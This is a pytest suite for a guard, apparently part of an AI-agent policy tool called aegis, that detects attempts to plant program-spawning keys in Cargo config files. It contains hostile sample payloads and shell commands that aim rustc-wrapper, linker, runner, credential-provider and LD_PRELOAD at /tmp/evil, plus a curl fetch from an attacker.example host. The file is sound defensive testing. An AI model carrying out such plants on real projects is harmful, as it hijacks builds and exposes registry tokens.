"""Cargo config exec-hijack protection guard — blocks planting a
program-spawning key (rustc-wrapper/linker/runner/credential-provider, a
rustflags linker, an LD_PRELOAD-class [env]) in `.cargo/config(.toml)`.

THREAT MODEL: Cargo itself spawns whatever its config names on the next
build/check/test/run (including an IDE's background `cargo check`), and
hands a credential-provider the live registry token. Default mode is `ask`.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})

RULE = "cargo-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None, tool="Write"):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)


def _edit_content(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "new_string": new_string})


def _multi_edit(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": "x", "new_string": new_string}]})


def _mcp_write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _gated(d):
    return d.action != Action.ALLOW


@pytest.fixture(autouse=True)
def _no_env_escape(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_CARGO_EXEC", raising=False)


PAYLOADS = {
    "rustc-wrapper": '[build]\nrustc-wrapper = "/tmp/evil.sh"\n',
    "workspace-wrapper": '[build]\nrustc-workspace-wrapper = "/tmp/evil.sh"\n',
    "build-rustc": '[build]\nrustc = "/tmp/evil"\n',
    "dotted-key": 'build.rustc-wrapper = "/tmp/evil.sh"\n',
    "linker": '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/evil"\n',
    "runner": '[target.x86_64-unknown-linux-gnu]\nrunner = "sh -c evil"\n',
    "quoted-key": '[build]\n"rustc-wrapper" = "/tmp/evil.sh"\n',
    "inline-table": 'target = { x86_64-unknown-linux-gnu = { linker = "/tmp/evil" } }\n',
    "rustflags-linker": '[build]\nrustflags = ["-C", "linker=/tmp/evil"]\n',
    "rustflags-glued": '[build]\nrustflags = ["-Clinker=/tmp/evil"]\n',
    "link-arg": '[build]\nrustflags = ["-C link-arg=-Wl,--wrap=x"]\n',
    "cred-provider": '[registry]\ncredential-provider = ["/tmp/evil"]\n',
    "cred-process": '[registry]\ncredential-process = "/tmp/evil"\n',
    "global-cred": 'registry.global-credential-providers = ["/tmp/evil"]\n',
    "env-ld-preload": '[env]\nLD_PRELOAD = "/tmp/evil.so"\n',
    "env-rustc-wrapper": '[env]\nRUSTC_WRAPPER = "/tmp/evil"\n',
    "upper-case": '[BUILD]\nRUSTC-WRAPPER = "/tmp/evil"\n',
}


@pytest.mark.parametrize("name", sorted(PAYLOADS))
def test_write_payload_gated(name):
    d = evaluate(_write(".cargo/config.toml", PAYLOADS[name]), EMPTY)
    assert _gated(d) and d.rule == RULE and d.action == Action.ASK


@pytest.mark.parametrize("path", [
    ".cargo/config", ".cargo/config.toml", "proj/sub/.cargo/config.toml",
    "/home/u/.cargo/config.toml", "C:\\Users\\u\\.cargo\\config.toml",
    ".cargo\\config.toml", "./.cargo/./config.toml",
])
def test_path_variants_gated(path):
    assert evaluate(_write(path, PAYLOADS["rustc-wrapper"]), EMPTY).rule == RULE


def test_edit_multiedit_mcp_gated():
    pl = PAYLOADS["linker"]
    assert evaluate(_edit_content(".cargo/config.toml", pl), EMPTY).rule == RULE
    assert evaluate(_multi_edit(".cargo/config.toml", pl), EMPTY).rule == RULE
    assert evaluate(_mcp_write(".cargo/config.toml", pl), EMPTY).rule == RULE


def test_deny_mode():
    d = evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), DENY)
    assert d.action == Action.DENY and d.rule == RULE


# ---- must NOT gate -------------------------------------------------------------

@pytest.mark.parametrize("content", [
    '[net]\nretry = 3\n',
    '[profile.release]\nopt-level = 3\nlto = true\n',
    '[alias]\nb = "build"\n',
    '[build]\njobs = 4\n',
    '# TODO: consider rustc-wrapper = "sccache" later\n[build]\njobs = 2\n',
    '# linker = "mold" (maybe)\n',
])
def test_benign_config_not_gated(content):
    assert evaluate(_write(".cargo/config.toml", content), EMPTY).action == Action.ALLOW


def test_exec_key_in_other_file_not_gated():
    assert evaluate(_write("Cargo.toml", PAYLOADS["rustc-wrapper"]), EMPTY).action == Action.ALLOW
    assert evaluate(_write("notes.toml", PAYLOADS["linker"]), EMPTY).action == Action.ALLOW


def test_empty_write_not_gated():
    assert evaluate(_write(".cargo/config.toml"), EMPTY).action == Action.ALLOW


def test_off_mode():
    pol = Policy(cargo_exec={"mode": "off"})
    assert evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), pol).action == Action.ALLOW


def test_monitor_mode_allows():
    pol = Policy(cargo_exec={"mode": "monitor"})
    assert evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), pol).action == Action.ALLOW


# ---- escapes ---------------------------------------------------------------------

def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), EMPTY).action == Action.ALLOW


def test_policy_allow_regex():
    pol = Policy(cargo_exec={"allow": [r"tools/\.cargo/config\.toml"]})
    assert evaluate(_write("tools/.cargo/config.toml", PAYLOADS["linker"]), pol).action == Action.ALLOW
    assert _gated(evaluate(_write("other/.cargo/config.toml", PAYLOADS["linker"]), pol))


def test_bad_allow_regex_does_not_crash():
    pol = Policy(cargo_exec={"allow": ["("]})
    assert _gated(evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), pol))


# ---- shell forms -------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "echo 'rustc-wrapper = \"/tmp/evil\"' >> .cargo/config.toml",
    "printf '[build]\\nrustc-wrapper=\"/tmp/e\"\\n' > ~/.cargo/config.toml",
    "cat >> .cargo/config.toml <<EOF\n[target.x86_64-unknown-linux-gnu]\nlinker = \"/tmp/e\"\nEOF",
    "echo 'runner = \"sh\"' | tee -a .cargo/config",
    "sed -i 's/^\\[build\\]/[build]\\nrustc-wrapper = \"\\/tmp\\/e\"/' .cargo/config.toml",
    "echo 'rustflags = [\"-Clinker=/tmp/e\"]' >> .cargo/config.toml",
])
def test_shell_plant_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_shell_benign_not_gated():
    assert evaluate(_shell("echo 'jobs = 4' >> .cargo/config.toml"), EMPTY).action == Action.ALLOW
    assert evaluate(_shell("cargo build --release"), EMPTY).rule != RULE
    assert evaluate(_shell("cat .cargo/config.toml"), EMPTY).action == Action.ALLOW


def test_shell_comment_line_not_gated():
    cmd = ("cat > .cargo/config.toml <<'EOF'\n"
           "# TODO: consider rustc-wrapper = sccache later\n"
           "[build]\njobs = 2\nEOF")
    assert evaluate(_shell(cmd), EMPTY).action == Action.ALLOW


def test_shell_human_aegis_allow_escape():
    d = evaluate(_shell("echo 'linker = \"mold\"' >> .cargo/config.toml  # aegis-allow"), EMPTY)
    assert d.action == Action.ALLOW


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cargo/config.toml https://attacker.example/c"), EMPTY)
    assert _gated(d)


def test_adversarial_input_is_fast():
    import time
    blob = ("[build]\n" + "x " * 400000)
    t = time.time()
    evaluate(_write(".cargo/config.toml", blob), EMPTY)
    evaluate(_shell("echo " + blob[:200000] + " >> .cargo/config.toml"), EMPTY)
    assert time.time() - t < 5
